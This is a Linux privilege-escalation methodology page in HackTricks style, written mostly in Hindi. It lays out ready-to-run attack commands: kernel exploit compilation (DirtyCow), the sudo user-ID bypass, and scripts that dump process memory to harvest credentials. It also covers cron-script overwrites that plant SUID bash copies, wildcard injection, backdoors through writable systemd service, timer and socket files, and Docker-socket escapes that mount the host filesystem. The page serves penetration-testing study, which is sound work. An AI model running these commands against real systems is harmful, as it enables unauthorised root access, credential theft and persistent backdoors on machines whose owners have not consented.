# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## सिस्टम जानकारी

### OS जानकारी

आइए चल रहे OS की जानकारी हासिल करना शुरू करें।
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आपके पास **`PATH` वेरिएबल के किसी भी फ़ोल्डर पर write permissions** हैं, तो आप कुछ libraries या binaries को hijack कर सकते हैं:
```bash
echo $PATH
```
### Env जानकारी

Environment variables में कोई दिलचस्प जानकारी, पासवर्ड या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel version की जाँच करें और देखें कि कोई exploit है जिसे escalate privileges के लिए इस्तेमाल किया जा सके।
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
यहाँ आप एक अच्छी vulnerable kernel list और कुछ पहले से ही **compiled exploits** पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
अन्य साइटें जहाँ आप कुछ **compiled exploits** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेब से सभी vulnerable kernel versions निकालने के लिए आप कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploits खोजने में मदद करने वाले उपकरण:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim पर चलाएँ, केवल kernel 2.x के लिए exploits की जाँच करता है)

सदैव **kernel version को Google पर खोजें**, शायद आपका kernel version किसी kernel exploit में लिखा होगा और तब आप सुनिश्चित हो जाएंगे कि यह exploit वैध है।

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

उन असुरक्षित sudo संस्करणों के आधार पर जो निम्न में दिखाई देते हैं:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके यह जांच सकते हैं कि sudo का संस्करण vulnerable है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

द्वारा @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg सिग्नेचर सत्यापन विफल

देखें **smasher2 box of HTB** कि इस vuln को कैसे exploited किया जा सकता है इसका एक **example**
```bash
dmesg 2>/dev/null | grep "signature"
```
### अधिक system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित सुरक्षा उपायों को सूचीबद्ध करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

यदि आप किसी docker container के अंदर हैं तो आप इससे बाहर निकलने की कोशिश कर सकते हैं:

{{#ref}}
docker-security/
{{#endref}}

## ड्राइव्स

जाँचें **क्या mounted और unmounted है**, कहाँ और क्यों। यदि कुछ भी unmounted है तो आप उसे mount करने की कोशिश कर सकते हैं और निजी जानकारी के लिए जाँच कर सकते हैं।
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ्टवेयर

उपयोगी binaries को सूचीबद्ध करें
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
इसके अलावा, जांचें कि **कोई compiler स्थापित है**। यह उपयोगी है अगर आपको किसी kernel exploit का उपयोग करना हो, क्योंकि यह अनुशंसित है कि आप इसे उसी मशीन पर compile करें जहाँ आप इसका उपयोग करने जा रहे हैं (या किसी समान मशीन पर)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### इंस्टॉल किए गए कमजोर सॉफ़्टवेयर

इंस्टॉल किए गए पैकेजों और सेवाओं के **संस्करण** की जाँच करें। शायद कोई पुराना Nagios संस्करण (उदाहरण के लिए) हो जिसे escalating privileges के लिए exploited किया जा सके…\
अनुशंसा की जाती है कि अधिक संदिग्ध इंस्टॉल किए गए सॉफ़्टवेयर के संस्करण को मैन्युअल रूप से जांचा जाए।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _ध्यान दें कि ये कमांड्स बहुत सारी जानकारी दिखाएँगे जो अधिकांशतः बेकार होगी, इसलिए OpenVAS या इसी तरह के किसी एप्लिकेशन का उपयोग करने की सलाह दी जाती है जो यह जाँच सके कि कोई इंस्टॉल किया गया सॉफ़्टवेयर संस्करण ज्ञात exploits के लिए कमजोर तो नहीं है_

## Processes

देखें कि **कौन से प्रोसेस** चलाए जा रहे हैं और जाँचें कि किसी प्रोसेस के पास उसकी अपेक्षा से **अधिक अधिकार** तो नहीं हैं (शायद कोई tomcat root द्वारा चल रहा हो?)
```bash
ps aux
ps -ef
top -n 1
```
हमेशा संभावित [**electron/cef/chromium debuggers** चल रहे हैं, आप इन्हें अधिकार बढ़ाने के लिए दुरुपयोग कर सकते हैं](electron-cef-chromium-debugger-abuse.md) की जाँच करें। **Linpeas** इनको process की command line में `--inspect` parameter चेक करके detect करता है।\  
साथ ही **process के binaries पर अपने privileges की जाँच करें**, हो सकता है आप किसी को overwrite कर सकें।

### Process monitoring

आप प्रोसेस मॉनिटर करने के लिए [**pspy**](https://github.com/DominicBreuker/pspy) जैसे tools का उपयोग कर सकते हैं। यह अक्सर चलने वाले या जब कुछ शर्तें पूरी हों तब चलने वाले vulnerable processes की पहचान करने में बहुत उपयोगी हो सकता है।

### Process memory

कुछ सर्विसेज़ सर्वर की मेमोरी के अंदर **credentials in clear text** सेव कर देती हैं।\  
आम तौर पर आपको अन्य यूज़र्स के प्रोसेस की मेमोरी पढ़ने के लिए **root privileges** की आवश्यकता होगी, इसलिए यह आमतौर पर तब अधिक उपयोगी होता है जब आप पहले से ही root हैं और अधिक credentials पता करना चाहते हैं।\  
हालाँकि, ध्यान रखें कि **एक सामान्य यूज़र के रूप में आप उन प्रोसेसों की मेमोरी पढ़ सकते हैं जिनके आप मालिक हैं**।

> [!WARNING]
> ध्यान दें कि आजकल अधिकांश मशीनें **डिफ़ॉल्ट रूप से ptrace की अनुमति नहीं देतीं**, जिसका मतलब है कि आप अपने अनप्रिविलेज्ड यूज़र के अन्य प्रोसेस को डंप नहीं कर सकते।
>
> फ़ाइल _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace की पहुँच नियंत्रित करती है:
>
> - **kernel.yama.ptrace_scope = 0**: सभी प्रोसेस को debug किया जा सकता है, बशर्ते उनका uid समान हो। यह ptracing का पारंपरिक तरीका है।
> - **kernel.yama.ptrace_scope = 1**: केवल parent process को debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability की आवश्यकता होती है।
> - **kernel.yama.ptrace_scope = 3**: ptrace से कोई भी प्रोसेस trace नहीं किया जा सकता। एक बार सेट करने के बाद ptracing को पुनः सक्षम करने के लिए reboot की आवश्यकता होती है।

#### GDB

यदि आपके पास किसी FTP सेवा की मेमोरी तक पहुँच है (उदाहरण के लिए), तो आप Heap प्राप्त कर सकते हैं और उसके अंदर मौजूद credentials खोज सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए हुए process ID के लिए, **maps दिखाती हैं कि memory उस process के virtual address space में कैसे mapped है**; यह प्रत्येक mapped region की **permissions** भी दिखाती है। **mem** pseudo file **process की memory को स्वयं एक्सपोज़ करता है**। **maps** file से हमें पता चलता है कि कौन से **memory regions readable** हैं और उनके offsets क्या हैं। हम इन जानकारियों का उपयोग करके **mem file में seek करके सभी readable regions को एक file में dump करते हैं**।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुंच प्रदान करता है, न कि वर्चुअल मेमोरी तक। कर्नेल के वर्चुअल एड्रेस स्पेस तक पहुंच /dev/kmem का उपयोग करके की जा सकती है.\
आमतौर पर, `/dev/mem` केवल **root** और **kmem** समूह द्वारा ही पढ़ा जा सकता है।
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump Windows के लिए Sysinternals suite के क्लासिक ProcDump टूल का Linux के लिए पुनर्कल्पना है। इसे यहाँ प्राप्त करें: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### उपकरण

किसी process की memory को dump करने के लिए आप निम्न का उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअली root आवश्यकताओं को हटाकर उस process को dump कर सकते हैं जिसका मालिक आप हैं
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root आवश्यक है)

### Process Memory से Credentials

#### मैनुअल उदाहरण

यदि आप पाते हैं कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (पहले के सेक्शन्स देखें ताकि process की memory dump करने के विभिन्न तरीके मिलें) और memory के अंदर credentials खोज सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) मेमोरी से **सादा टेक्स्ट क्रेडेंशियल्स चुराएगा** और कुछ **जानी-मानी फ़ाइलों** से भी। इसे ठीक से काम करने के लिए रूट विशेषाधिकार (root privileges) चाहिए।

| विशेषता                                          | प्रोसेस नाम           |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### खोज Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## अनुसूचित/Cron jobs

जाँचें कि कोई भी अनुसूचित job कमजोर तो नहीं है। शायद आप उस script का फायदा उठा सकें जो root द्वारा executed होती है (wildcard vuln? root द्वारा उपयोग की जाने वाली files को modify कर सकते हैं? symlinks का उपयोग करें? root द्वारा उपयोग की जाने वाले directory में specific files बनाएं?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron पथ

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि उपयोगकर्ता "user" के पास /home/user पर लिखने की अनुमति है_)

यदि इस crontab में root PATH सेट किए बिना किसी कमांड या स्क्रिप्ट को चलाने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तब, आप निम्नलिखित का उपयोग करके root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron एक script के साथ wildcard का उपयोग करते हुए (Wildcard Injection)

यदि कोई script root द्वारा execute किया जाता है और command के अंदर “**\***” है, तो आप इसे exploit करके अनपेक्षित चीजें कर सकते हैं (जैसे privesc). उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard किसी path जैसे** _**/some/path/\***_ **से पहले हो, तो यह vulnerable नहीं है (यहाँ तक कि** _**./\***_ **भी नहीं)।**

अधिक wildcard exploitation tricks के लिए निम्नलिखित पेज पढ़ें:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Cron script overwriting and symlink

यदि आप **cron script को modify कर सकते हैं** जो root द्वारा executed होता है, तो आप बहुत आसानी से एक shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
यदि root द्वारा execute किया गया script किसी **directory where you have full access** का उपयोग करता है, तो उस folder को delete करना और एक **create a symlink folder to another one** बनाकर उस पर आपकी नियंत्रित script चलाना उपयोगी हो सकता है।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### बार-बार चलने वाले cron jobs

आप उन processes की निगरानी कर सकते हैं जो हर 1, 2 या 5 मिनट पर चल रही होती हैं। शायद आप इसका फायदा उठाकर escalate privileges कर सकें।

उदाहरण के लिए, **1 मिनट के दौरान हर 0.1s पर निगरानी करने** के लिए, **कम निष्पादित किए गए कमांड्स के अनुसार sort करने** और सबसे अधिक निष्पादित किए गए कमांड्स को हटाने के लिए, आप कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप भी उपयोग कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह हर शुरू होने वाली process को मॉनिटर करेगा और सूचीबद्ध करेगा).

### अदृश्य cron jobs

यह संभव है कि एक cronjob बनाया जाए **comment के बाद carriage return डालकर** (newline character के बिना), और cron job काम करेगा। उदाहरण (ध्यान दें carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## सेवाएं

### लिखने योग्य _.service_ फाइलें

जाँचें कि क्या आप किसी `.service` फाइल को लिख सकते हैं, अगर कर सकते हैं तो आप इसे बदलकर यह सुनिश्चित कर सकते हैं कि यह आपकी **backdoor** को **executes** करे जब सेवा **started**, **restarted** या **stopped** हो (शायद आपको मशीन के reboot होने तक इंतजार करना पड़े)।\
उदाहरण के लिए अपनी backdoor को .service फाइल के अंदर बनाएं जैसे **`ExecStart=/tmp/script.sh`**

### लिखने योग्य service binaries

ध्यान रखें कि अगर आपके पास **write permissions over binaries being executed by services** हैं, तो आप उन्हें backdoors के लिए बदल सकते हैं ताकि जब सेवाएं फिर से चलें तो backdoors भी executed हो जाएँ।

### systemd PATH - Relative Paths

आप **systemd** द्वारा उपयोग किए गए PATH को निम्नलिखित से देख सकते हैं:
```bash
systemctl show-environment
```
यदि आप पथ के किसी भी फ़ोल्डर में **write** कर सकते हैं तो आप संभवतः **escalate privileges** कर सकते हैं। आपको **relative paths being used on service configurations** वाली फ़ाइलों में तलाश करनी चाहिए, जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, उस systemd PATH फ़ोल्डर के अंदर जिस पर आप लिख सकते हैं, relative path binary के same नाम के साथ एक **executable** बनाइए, और जब सेवा से vulnerable action (**Start**, **Stop**, **Reload**) को execute करने के लिए कहा जाएगा, तो आपका **backdoor will be executed** (unprivileged users आमतौर पर सेवाओं को start/stop नहीं कर सकते, लेकिन जाँच करें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**Learn more about services with `man systemd.service`.**

## **Timers**

**Timers** systemd unit files होते हैं जिनका नाम `**.timer**` पर समाप्त होता है और जो `**.service**` फ़ाइलों या events को नियंत्रित करते हैं। **Timers** को cron के विकल्प के रूप में इस्तेमाल किया जा सकता है क्योंकि इनमें calendar time events और monotonic time events के लिए बिल्ट-इन सपोर्ट होता है और इन्हें asynchronously चलाया जा सकता है।

आप सभी timers को निम्न के साथ सूचीबद्ध कर सकते हैं:
```bash
systemctl list-timers --all
```
### लिखने योग्य टाइमर

यदि आप किसी टाइमर को संशोधित कर सकते हैं तो आप इसे systemd.unit की कुछ मौजूदा इकाइयों (जैसे `.service` या `.target`) को चलाने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> जब यह timer समाप्त होता है तो सक्रिय करने के लिए Unit। तर्क एक unit name है, जिसका suffix ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो यह मान उस service पर डिफ़ॉल्ट होता है जिसका नाम timer unit के समान होता है, सिवाय suffix के। (See above.) अनुशंसित है कि सक्रिय किए जाने वाले unit का नाम और timer unit का नाम suffix को छोड़कर समान हों।

Therefore, to abuse this permission you would need to:

- किसी systemd unit (जैसे `.service`) को ढूँढें जो **executing a writable binary** हो
- किसी systemd unit को ढूँढें जो **executing a relative path** कर रहा हो और आपके पास उस **systemd PATH** पर **writable privileges** हों (to impersonate that executable)

**Learn more about timers with `man systemd.timer`.**

### **टाइमर सक्षम करना**

To enable a timer you need root privileges and to execute:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## सॉकेट्स

Unix Domain Sockets (UDS) क्लाइंट-सर्वर मॉडल में समान या अलग मशीनों पर **process communication** सक्षम करते हैं। वे इंटर-कम्प्यूटर संचार के लिए मानक Unix descriptor फ़ाइलों का उपयोग करते हैं और `.socket` फ़ाइलों के माध्यम से सेटअप किए जाते हैं।

Sockets को `.socket` फ़ाइलों का उपयोग करके कॉन्फ़िगर किया जा सकता है।

**सॉकेट्स के बारे में अधिक जानने के लिए `man systemd.socket` देखें।** इस फ़ाइल के भीतर, कई रोचक पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग हैं पर एक सारांश **यह दर्शाने के लिए** प्रयोग होता है कि यह socket कहाँ सुनने वाला है (AF_UNIX socket फ़ाइल का पथ, IPv4/6 और/या सुनने के लिए पोर्ट नंबर, आदि)।
- `Accept`: एक boolean argument लेता है। अगर **true** है, तो प्रत्येक इनकमिंग कनेक्शन के लिए एक **service instance is spawned for each incoming connection** और केवल कनेक्शन socket ही उसे पास किया जाता है। अगर **false** है, तो सभी listening sockets स्वयं **passed to the started service unit** होते हैं, और सभी कनेक्शनों के लिए केवल एक service unit स्पॉन किया जाता है। यह मान datagram sockets और FIFOs के लिए अनदेखा किया जाता है जहाँ एक single service unit बिना शर्त सभी इनकमिंग ट्रैफ़िक को हैंडल करता है। **डिफ़ॉल्ट false है।** प्रदर्शन कारणों से, नए daemons को केवल ऐसे तरीके से लिखने की सलाह दी जाती है जो `Accept=no` के अनुकूल हों।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेता है, जो listening **sockets**/FIFOs के बनाने और bind होने से क्रमशः पहले या बाद में निष्पादित होते हैं। कमांड लाइन का पहला token एक absolute filename होना चाहिए, उसके बाद process के लिए arguments आते हैं।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जो listening **sockets**/FIFOs के बंद और हटाए जाने से क्रमशः पहले या बाद में निष्पादित होते हैं।
- `Service`: incoming traffic पर सक्रिय करने के लिए **service** unit का नाम निर्दिष्ट करता है। यह सेटिंग केवल Accept=no वाले sockets के लिए अनुमति है। यह डिफ़ॉल्ट रूप से उसी नाम वाली service का उपयोग करता है जैसा सॉकेट का नाम है (suffix बदलकर)। अधिकतर मामलों में, इस विकल्प का उपयोग आवश्यक नहीं होना चाहिए।

### Writable .socket files

यदि आपको कोई **writable** `.socket` फ़ाइल मिलती है तो आप `[Socket]` सेक्शन की शुरुआत में कुछ ऐसा जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और backdoor socket बनाए जाने से पहले निष्पादित हो जाएगा। इसलिए, आपको **संभावत: मशीन के reboot होने तक प्रतीक्षा** करनी होगी.\
_ध्यान रहें कि सिस्टम को उस socket फ़ाइल कॉन्फ़िगरेशन का उपयोग कर रहा होना चाहिए वरना backdoor निष्पादित नहीं होगा_

### Writable sockets

यदि आप कोई **writable socket** पहचानते हैं (_यहाँ अब हम Unix Sockets की बात कर रहे हैं, न कि config `.socket` फ़ाइलों की_), तो आप उस socket के साथ **communicate** कर सकते हैं और संभवतः किसी vulnerability का exploit कर सकते हैं।

### Unix Sockets को सूचीबद्ध करना
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets listening for HTTP** requests हो सकते हैं (_मैं .socket files की बात नहीं कर रहा हूँ बल्कि उन फाइलों की बात कर रहा हूँ जो unix sockets के रूप में काम कर रही हैं_)। आप इसे निम्न से जाँच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
यदि socket **HTTP अनुरोध का उत्तर देता है**, तो आप इसके साथ **संवाद** कर सकते हैं और शायद **exploit some vulnerability**।

### लिखने योग्य Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

यदि आपके पास Docker socket पर लिखने की अनुमति है, तो आप निम्न commands का उपयोग करके escalate privileges कर सकते हैं:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये कमांड आपको होस्ट के फ़ाइल सिस्टम पर root-स्तरीय पहुँच के साथ एक कंटेनर चलाने की अनुमति देती हैं।

#### **Docker API का प्रत्यक्ष उपयोग**

ऐसे मामलों में जहाँ Docker CLI उपलब्ध नहीं है, Docker socket को फिर भी Docker API और `curl` कमांड्स का उपयोग करके नियंत्रित किया जा सकता है।

1.  **List Docker Images:** उपलब्ध images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** होस्ट सिस्टम की रूट निर्देशिका को माउंट करने वाला एक कंटेनर बनाने का अनुरोध भेजें।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

नए बनाए गए कंटेनर को स्टार्ट करें:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** कंटेनर से कनेक्शन स्थापित करने के लिए `socat` का उपयोग करें, जिससे उसके अंदर कमांड निष्पादन संभव हो।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` कनेक्शन सेट अप करने के बाद, आप कंटेनर में सीधे कमांड चला सकते हैं और होस्ट के फ़ाइल सिस्टम पर root-स्तरीय पहुँच प्राप्त कर सकते हैं।

### अन्य

ध्यान दें कि यदि आपके पास docker socket पर write permissions हैं क्योंकि आप **inside the group `docker`** हैं तो आपके पास [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)। यदि [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

देखें **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

यदि आप पाते हैं कि आप **`ctr`** कमांड का उपयोग कर सकते हैं तो निम्नलिखित पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

यदि आप पाते हैं कि आप **`runc`** कमांड का उपयोग कर सकते हैं तो निम्नलिखित पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक परिष्कृत inter-Process Communication (IPC) system है जो अनुप्रयोगों को प्रभावी ढंग से परस्पर बातचीत करने और डेटा साझा करने में सक्षम बनाता है। यह आधुनिक Linux सिस्टम को ध्यान में रखकर डिज़ाइन किया गया है और अनुप्रयोग संचार के विभिन्न रूपों के लिए एक मजबूत फ्रेमवर्क प्रदान करता है।

